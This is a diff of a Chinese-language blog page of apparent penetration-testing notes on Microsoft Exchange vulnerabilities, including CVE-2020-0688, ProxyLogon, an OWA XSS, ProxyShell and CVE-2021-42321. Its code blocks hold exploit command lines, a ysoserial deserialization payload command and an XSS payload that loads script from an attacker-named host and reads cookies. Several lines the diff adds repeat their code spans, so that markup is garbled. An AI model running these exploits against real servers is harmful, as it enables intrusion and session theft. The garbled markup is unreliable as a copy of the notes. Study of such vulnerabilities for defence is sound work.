@@ -8,7 +8,7 @@
 <p><strong>漏洞原理</strong>：</p>
 <p>感觉这个洞跟Shiro差不多，都是密钥有问题，被反序列化。</p>
 <p>四个参数 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span><br><span class="line">--validationalg = SHA1</span><br><span class="line">--generator=B97B4E27 （基本默认）</span><br><span class="line">--viewstateuserkey = </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF<br>--validationalg = SHA1<br>--generator=B97B4E27 （基本默认）<br>--viewstateuserkey = <br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>在这四个变量中，前两个为默认固定，viewstateuserkey和generator的值需要从经过身份验证的session中收集。viewstateuserkey可以从ASP.NET的_SessionID cookie中获取，而generator可以在一个隐藏字段__VIEWSTATEGENERATOR中找到</p>
@@ -19,7 +19,7 @@
 <p>在Response选项卡搜索__VIEWSTATEGENERATOR获取字段值，作为 generator</p>
 <p>exp: </p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-0688.py -s https://target/owa -u username -p password -c &quot;ping dnslog&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">python3 cve-2020-0688.py -s https://target/owa -u username -p password -c "ping dnslog"<br></code></pre></td></tr></table></figure>
 
 
 
@@ -32,7 +32,7 @@
 <p><strong>漏洞原理</strong> </p>
 <p>CVE-2021-26855是一个SSRF漏洞，利用该漏洞可以绕过Exchange的身份验证，CVE-2021-27065是一个文件写入漏洞。二者结合可以在未登录的状态下写入webshell。</p>
 <p>exp: <a target="_blank" rel="noopener" href="https://github.com/herwonowr/exprolog">https://github.com/herwonowr/exprolog</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exprolog.py -t target.com -e user.target.com -x &quot;ping dnslog&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">python3 exprolog.py -t target.com -e user.target.com -x "ping dnslog"<br></code></pre></td></tr></table></figure>
 
 
 
@@ -47,9 +47,9 @@
 <p>Exchange Server 2016 &lt; Jul21SU </p>
 <p>Exchange Server 2019 &lt; Jul21SU</p>
 <p><strong>漏洞原理: XSS</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.1.1/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=&#125;&#125;&#125;;alert(document.cookie)//</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=&#125;&#125;&#125;;alert(document.cookie)//<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.1.1/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=&#125;&#125;&#125;;document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=&#125;&#125;&#125;;document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//<br></code></pre></td></tr></table></figure>
 
 <p>看起来挺不起眼的洞，也很容易被忽略，说不定会有大用。</p>
 <h1 id="0x4-ProxyShell"><a href="#0x4-ProxyShell" class="headerlink" title="0x4. ProxyShell"></a>0x4. ProxyShell</h1><p>CVE-2021-34473</p>
@@ -64,17 +64,17 @@
 </ol>
 <p>看起来是基于ProxyLogon中SSRF的漏洞</p>
 <p>poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target/autodiscover/autodiscover.json?@noname.com/mapi/nspi/?</span><br><span class="line">&amp;Email=autodiscover/autodiscover.json%3f@noname.com</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs awk">https:<span class="hljs-regexp">//</span>target<span class="hljs-regexp">/autodiscover/</span>autodiscover.json?@noname.com<span class="hljs-regexp">/mapi/</span>nspi/?<br>&amp;Email=autodiscover/autodiscover.json%<span class="hljs-number"><code class="language-hljs awk">https:<span class="hljs-regexp">//</span>target<span class="hljs-regexp">/autodiscover/</span>autodiscover.json?@noname.com<span class="hljs-regexp">/mapi/</span>nspi/?<br>&amp;Email=autodiscover/autodiscover.json%<span class="hljs-number">3</span>f@noname.com<br></code></pre></td></tr></table></figure>
 
 <p>exp:</p>
 <p>通过Exp <a target="_blank" rel="noopener" href="https://github.com/horizon3ai/proxyshell">https://github.com/horizon3ai/proxyshell</a> 获取已存在用户邮箱用户名:</p>
 <p>python exchange_proxyshell.py -u <a target="_blank" rel="noopener" href="https://192.168.92.130/">https://192.168.92.130</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/hosch3n/ProxyVulns">https://github.com/hosch3n/ProxyVulns</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage: python3 34473.py 1.1.1.1</span><br><span class="line"></span><br><span class="line">Usage: python3 31207.py 1.1.1.1 [Local File Path] [UNC Absolute Path]</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs apache"><span class="hljs-attribute">Usage</span>: python<span class="hljs-number">3</span> <span class="hljs-number">34473</span>.py <span class="hljs-number">1.1.1.1</span><br><br><span class="hljs-attribute">Usage</span>: python<span class="hljs-number">3</span> <span class="hljs-number">31207</span>.py <span class="hljs-number">1.1.1.1</span><span class="hljs-meta"><code class="language-hljs apache"><span class="hljs-attribute">Usage</span>: python<span class="hljs-number">3</span> <span class="hljs-number">34473</span>.py <span class="hljs-number">1.1.1.1</span><br><br><span class="hljs-attribute">Usage</span>: python<span class="hljs-number">3</span> <span class="hljs-number">31207</span>.py <span class="hljs-number">1.1.1.1</span><span class="hljs-meta"> [Local File Path] [UNC Absolute Path]</span><br></code></pre></td></tr></table></figure>
 
 <h1 id="0x4-CVE-2021-42321"><a href="#0x4-CVE-2021-42321" class="headerlink" title="0x4. CVE-2021-42321"></a>0x4. CVE-2021-42321</h1><p>该漏洞利用EWS(Exchange Web Service微软提供的一个访问Exchange资源的接口)写入用户配置信息，写入的 时候将payload写进去;写入前需要先将旧的配置信息删掉，删除的时候需要传入参数folderId的值; 这个值可以 通过 GetFolder 获取 ;最后利用GetClientAccessToken 触发反序列化。因此，要成功利用该漏洞除了Exchange 本身存在漏洞外，还需获取一个用户账号密码。   </p>
 <p>ysoserial生成反序列化Payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c &quot;ping 524f6b.dnslog.cn&quot; -o base64</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs apache"><span class="hljs-attribute">ysoserial</span>.exe -g TypeConfuseDelegate -f BinaryFormatter -c <span class="hljs-string">&quot;ping 524f6b.dnslog.cn&quot;</span> -o base<span class="hljs-number"><code class="language-hljs apache"><span class="hljs-attribute">ysoserial</span>.exe -g TypeConfuseDelegate -f BinaryFormatter -c <span class="hljs-string">&quot;ping 524f6b.dnslog.cn&quot;</span> -o base<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>
 
 <p>exp:</p>
 <p> <a target="_blank" rel="noopener" href="https://github.com/DarkSprings/CVE-2021-42321">https://github.com/DarkSprings/CVE-2021-42321</a> </p>
